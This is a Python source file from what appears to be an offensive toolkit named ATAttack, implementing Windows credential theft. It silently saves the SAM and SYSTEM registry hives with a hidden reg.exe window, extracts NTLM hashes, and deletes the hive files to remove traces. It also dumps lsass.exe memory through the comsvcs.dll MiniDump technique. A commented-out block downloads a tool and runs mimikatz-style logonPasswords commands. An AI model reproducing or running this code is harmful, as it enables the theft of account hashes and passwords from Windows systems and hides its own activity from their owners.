#!/usr/bin/python
# coding=utf-8

from ATAttack.framework.win32.hashdump import dump_file_hashes
from ATAttack.framework.constant import constant
import subprocess
import os
import wget
import re

try:
    import _subprocess as sub
    STARTF_USESHOWWINDOW = sub.STARTF_USESHOWWINDOW
    SW_HIDE = sub.SW_HIDE
except ImportError:
    STARTF_USESHOWWINDOW = subprocess.STARTF_USESHOWWINDOW
    SW_HIDE = subprocess.SW_HIDE

class samdump:

    def __init__(self):
        pass

    def save_hives(self):
        """
        Save SAM Hives
        """
        sammhives = []
        try:
            for h in constant.hives:
                if not os.path.exists(constant.hives[h]):
                    cmdline = r'reg.exe save hklm\%s %s' % (
                        h, constant.hives[h])
                    command = ['cmd.exe', '/c', cmdline]
                    info = subprocess.STARTUPINFO()
                    info.dwFlags = STARTF_USESHOWWINDOW
                    info.wShowWindow = SW_HIDE
                    p = subprocess.Popen(
                        command,
                        startupinfo=info,
                        stdin=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        stdout=subprocess.PIPE,
                        universal_newlines=True)
                    results, _ = p.communicate()
                    sammhives.append(constant.hives[h])
            ntlm = dump_file_hashes(sammhives[0], sammhives[1])
            # lsass_dump()
            return ntlm[0]
        except BaseException:  # Catch all kind of exceptions
            pass
        finally:
            self.delete_hives()

    def delete_hives(self):
        """
        Delete SAM Hives
        """
        # Try to remove all temporary files
        for h in constant.hives:
            if os.path.exists(constant.hives[h]):
                try:
                    os.remove(constant.hives[h])
                except Exception:
                    pass

    def lsassdump(self):

        tasklist = os.popen('tasklist /svc | findstr lsass.exe').read()
        regex = re.findall(r'\d+', tasklist, re.S)
        payload = r'powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump {} {} full"'.format(
            regex[0], constant.dump_name)
        os.popen(payload)
        # try:
        #     wget.download(url=constant.pyurl,out=constant.pyexe)
        #     payload1 = '{exe} "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit > {file}'.format(exe=constant.pyexe,file=constant.pyname)
        #     os.popen(payload1)
        #     print("lsass.exe process to Sucessfull")
        # except:
        #     pass